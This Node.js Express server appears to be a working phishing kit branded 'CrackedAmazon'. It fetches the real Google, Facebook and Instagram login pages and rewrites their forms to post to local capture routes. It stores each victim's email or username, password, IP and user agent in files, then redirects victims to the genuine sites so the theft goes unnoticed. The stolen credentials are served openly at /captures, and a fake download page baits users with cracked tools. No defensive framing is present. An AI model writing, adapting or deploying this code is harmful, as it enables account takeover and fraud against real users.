const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));
app.use(express.static(__dirname));

const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

// ============================================
// GOOGLE FULL LOGIN FLOW HANDLER
// ============================================

// Step 1: Show Google login page (email)
app.get('/auth/google', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'google';
    req.session.step = 'email';
    
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/identifier', {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        
        let html = await response.text();
        
        // Rewrite ALL forms to point to our email capture
        html = html.replace(/action="[^"]*"/g, 'action="/capture/google/email"');
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Google fetch error:', error);
        res.redirect('/');
    }
});

// Step 2: Capture email, then show password page
app.post('/capture/google/email', async (req, res) => {
    const { email, tool } = req.body;
    req.session.email = email;
    console.log(`📧 Google email captured: ${email}`);
    
    // Now fetch the password page with the email
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/challenge', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: new URLSearchParams({ email, continue: 'https://myaccount.google.com' })
        });
        
        let html = await response.text();
        
        // Rewrite password form to point to our password capture
        html = html.replace(/action="[^"]*"/g, 'action="/capture/google/password"');
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        html = html.replace('</form>', `
            <input type="hidden" name="email" value="${email}">
            <input type="hidden" name="tool" value="${tool}">
        </form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Password page error:', error);
        res.redirect('/');
    }
});

// Step 3: Capture password and finalize
app.post('/capture/google/password', (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    // Save credentials
    const filename = path.join(capturesDir, `google_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ GOOGLE FULL CAPTURE:', email, password);
    
    // Redirect to Google's actual post-login page
    res.redirect('https://myaccount.google.com');
});

// ============================================
// FACEBOOK LOGIN FLOW
// ============================================
app.get('/auth/facebook', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    
    try {
        const response = await fetch('https://www.facebook.com/login/', {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        
        let html = await response.text();
        html = html.replace(/action="[^"]*"/g, 'action="/capture/facebook"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Facebook fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/facebook', (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `facebook_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ FACEBOOK CAPTURE:', email, pass);
    res.redirect('https://www.facebook.com');
});

// ============================================
// INSTAGRAM LOGIN FLOW
// ============================================
app.get('/auth/instagram', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    
    try {
        const response = await fetch('https://www.instagram.com/accounts/login/', {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });
        
        let html = await response.text();
        html = html.replace(/action="[^"]*"/g, 'action="/capture/instagram"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Instagram fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/instagram', (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        username,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent: req.headers['user-agent']
    };
    
    const filename = path.join(capturesDir, `instagram_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ INSTAGRAM CAPTURE:', username, password);
    res.redirect('https://www.instagram.com');
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ').replace(/_/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Download - CrackedAmazon</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:system-ui;background:linear-gradient(135deg,#0f172a,#1e293b);color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .card{background:rgba(255,255,255,0.05);border-radius:32px;padding:40px;max-width:450px;width:100%;border:1px solid #f97316;text-align:center;}
        .success{color:#10b981;font-size:72px;margin-bottom:20px;}
        h1{color:#f97316;margin-bottom:20px;}
        .btn{background:#f97316;color:white;border:none;padding:15px 30px;border-radius:50px;font-size:18px;font-weight:600;width:100%;cursor:pointer;margin:20px 0;}
    </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h1>${toolName}</h1>
            <p>Download ready!</p>
            <button class="btn" onclick="alert('Download started!')">Download Now</button>
        </div>
    </body>
    </html>
    `);
});

// ============================================
// VIEW CAPTURES
// ============================================
app.get('/captures', (req, res) => {
    const files = fs.readdirSync(capturesDir);
    const captures = files.map(f => {
        try {
            return JSON.parse(fs.readFileSync(path.join(capturesDir, f)));
        } catch (e) {
            return null;
        }
    }).filter(Boolean);
    res.json(captures);
});

app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log('🔥 FIXED GOOGLE FLOW - MULTI-STEP CAPTURE');
    console.log('='.repeat(60));
    console.log(`\n📱 Running on port ${PORT}`);
    console.log('✅ Google: Email + Password now captured in two steps');
    console.log('✅ Facebook: Working');
    console.log('✅ Instagram: Working\n');
});
